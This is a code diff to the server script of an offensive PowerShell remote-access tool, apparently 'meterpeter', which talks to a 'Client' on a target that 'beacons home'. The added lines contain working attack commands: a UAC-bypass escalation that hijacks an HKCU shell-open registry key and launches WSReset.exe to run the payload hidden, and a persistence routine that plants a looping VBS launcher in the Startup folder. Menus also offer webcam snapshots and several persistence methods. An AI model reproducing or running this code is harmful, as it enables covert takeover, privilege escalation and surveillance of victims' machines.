@@ -187,11 +187,13 @@ If($DISTRO_OS)
 {
   ## Linux Distro
   $IPATH = "$pwd/";
+  $Flavor = "Linux";
   $Bin = "$pwd/mimiRatz/";
   $APACHE = "/var/www/html/";
 }else{
   ## Windows Distro
   $IPATH = "$pwd\";
+  $Flavor = "Windows";
   $Bin = "$pwd\mimiRatz\";
   $APACHE = "$env:LocalAppData\webroot\";
 }
@@ -382,6 +384,17 @@ While($Client.Connected)
       Write-Host $Modules;
       Write-Host "`n :meterpeter> " -NoNewline -ForeGroundColor Green;
       $Command = Read-Host;
+    }
+
+    ## venom v1.0.16 function
+    If($Command -eq "-v" -or $Command -eq "--version" -or $Command -eq "version")
+    {
+      write-host "`n`n Current Settings" -ForegroundColor green;
+      write-host " ----------------";
+      write-host " meterpeter version   : 2.10";
+      write-host " meterpeter flavor    : $Flavor Distro";
+      write-host " meterpeter WebServer : $APACHE";
+      write-host " meterpeter Server    : $IPATH";
     }
 
     ## venom v1.0.16 function
@@ -826,14 +839,14 @@ While($Client.Connected)
       write-host "   NoDrive   Hide Drives from Explorer       Client:Admin - Privileges Required";
       write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
       write-host "`n`n :meterpeter:Post> " -NoNewline -ForeGroundColor Green;
-      $choise = Read-Host;
+      $choise = Read-Host;      
       If($choise -eq "Escalate" -or $choice -eq "escal")
       {
         write-host "`n   Requirements" -ForegroundColor Yellow;
         write-host "   ------------";
         write-host "   Attacker needs to input the delay time (seconds) for Client";
         write-host "   to beacon home after the privilege escalation, and restart";
-        write-host "   the meterpeter.ps1 Server (Listenner) to recive connection.";
+        write-host "   meterpeter.ps1 Server (Listenner) to recive the connection.";
         write-host "`n`n   Modules     Description                  Remark" -ForegroundColor green;
         write-host "   -------     -----------                  ------";
         write-host "   getsystem   Escalate Client Privileges   Client:User  - Privileges required";
@@ -845,14 +858,14 @@ While($Client.Connected)
         {
           write-host " - Input Delay Time (eg: 60): " -NoNewline;
           $Input_Delay = Read-Host;
-          If(-not($Input_Delay)){$Input_Delay = "80"}
+          If(-not($Input_Delay) -or $Input_Delay -lt "40"){$Input_Delay = "60"}
           $Delay_Time = "$Input_Delay"+"000";
           write-host " Elevate Client ($payload_name.ps1) Privileges." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
-          Write-Host "   Status   Remote Path           Delay" -ForeGroundColor green;
-          Write-Host "   ------   -----------           -----";
-          Write-Host "   Saved    `$env:tmp\WStore.vbs   $Input_Delay(sec)`n`n";
-          Write-Host "   [i] Start meterpeter.ps1 again (use same ip|port|obfuscation)" -ForeGroundColor yellow;
-          Write-Host "   [i] to recive the elevated Connection back in $Input_Delay sec." -ForeGroundColor yellow;
+          Write-Host "   Status   Remote Path           Execution" -ForeGroundColor green;
+          Write-Host "   ------   -----------           ---------";
+          Write-Host "   Created  `$env:tmp\WStore.vbs   $Input_Delay (sec)`n`n";
+          Write-Host "   [i] Exit|Start meterpeter.ps1 again (use same ip|port|obfuscation)" -ForeGroundColor yellow;
+          Write-Host "   [i] to recive the elevated Connection back in $Input_Delay seconds." -ForeGroundColor yellow;Start-Sleep -Seconds 5;
           $Command = "echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `$env:tmp\WStore.vbs;echo 'WScript.sleep $Delay_Time' `>`> `$env:tmp\WStore.vbs;echo 'objShell.Run `"cmd /R powershell Start-Process -FilePath C:\Windows\System32\WSReset.exe -WindowStyle Hidden`", 0, True' `>`> `$env:tmp\WStore.vbs;`$cmdline = `"cmd /R start powershell -exec bypass -w 1 -File `$env:tmp\Update-KB4524147.ps1`";`$CommandPath = `"HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command`";New-Item `$CommandPath -Force|Out-Null;New-ItemProperty -Path `$CommandPath -Name `"DelegateExecute`" -Value `"`" -Force|Out-Null;Set-ItemProperty -Path `$CommandPath -Name `"(default)`" -Value `$cmdline -Force -ErrorAction SilentlyContinue|Out-Null;cmd.exe /R start %tmp%\WStore.vbs";
         }
         If($Escal_choise -eq "Delete" -or $Escal_choise -eq "del")
@@ -879,7 +892,7 @@ While($Client.Connected)
         write-host "   trigger the AntiVirus (WindowsDefender) Amsi Detection";
         write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
         write-host "   -------   -----------                     ------";
-        write-host "   Device    List WebCam Devices             Client:User  - Privileges required";
+        write-host "   Device    List WebCam Devices             Client:User  -  Privileges required";
         write-host "   Snap      Take WebCam Screenshot          Client:User:Admin  - Privs required";
         write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
         write-host "`n`n :meterpeter:Post:Cam> " -NoNewline -ForeGroundColor Green;
@@ -941,14 +954,14 @@ While($Client.Connected)
         write-host "`n   Requirements" -ForegroundColor Yellow;
         write-host "   ------------";
         write-host "   Client must be deploy in target %TEMP% folder.";
-        write-host "   Server must be restarted to recive connection.";
-        write-host "   Target machine needs to restart to beacon home.";
+        write-host "   Server must be put in listener mode using same configs.";
+        write-host "   Target machine needs to restart (startup) to beacon home.";
         write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
         write-host "   -------   -----------                     ------";
         write-host "   Beacon    Persiste Client using startup   Client:User  - Privileges required";
         write-host "   RUNONCE   Persiste Client using REG:Run   Client:User  - Privileges required";
         write-host "   REGRUN    Persiste Client using REG:Run   Client:User|Admin - Privs required";
-        write-host "   Schtasks  Persiste Client using Schtasks  Client:User|Admin - Privs required";
+        write-host "   Schtasks  Persiste Client using Schtasks  Client:Admin - Privileges required";
         write-host "   WinLogon  Persiste Client using WinLogon  Client:Admin - Privileges required";
         write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
         write-host "`n`n :meterpeter:Post:Persistance> " -NoNewline -ForeGroundColor Green;
@@ -958,12 +971,14 @@ While($Client.Connected)
           $BeaconTime = $Null;
           Write-host " - Input Time (sec) to beacon home (eg: 60): " -NoNewline;
           $Delay_Time = Read-Host;
+          If(-not($Delay_Time) -or $Delay_Time -lt "30"){$Delay_Time = "60"}
           $BeaconTime = "$Delay_Time"+"000";
-          If(-not($BeaconTime)){$BeaconTime = "60000"}
-          write-host " Execute Client ($payload_name.ps1) with $BeaconTime (sec) loop." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
-          Write-Host "   Persist                Remote Path (trigger)" -ForeGroundColor green;
-          Write-Host "   -------                ---------------------";
-          Write-Host "   Update-KB4524147.ps1   `$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`n";
+          write-host " Execute Client ($payload_name.ps1) at $Delay_Time (sec) loop." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
+          Write-Host "   Scripts               Remote Path" -ForeGroundColor green;
+          Write-Host "   -------               -----------";
+          Write-Host "   $payload_name.ps1  `$env:tmp\$payload_name.ps1";
+          Write-Host "   $payload_name.vbs  `$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs";
+          Write-Host "   On StartUp our Client will beacon home from $Delay_Time to $Delay_Time seconds (loop)." -ForeGroundColor yellow;
           $Command = "echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'Do' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'wscript.sleep $BeaconTime' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'objShell.Run `"cmd.exe /R powershell.exe -Exec Bypass -Win 1 -File %tmp%\$payload_name.ps1`", 0, True' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'Loop' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo `"   [i] Client $Payload_name.ps1 successful Persisted ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";          
           # $Command = Variable_Obfuscation(Character_Obfuscation($Command));
           }
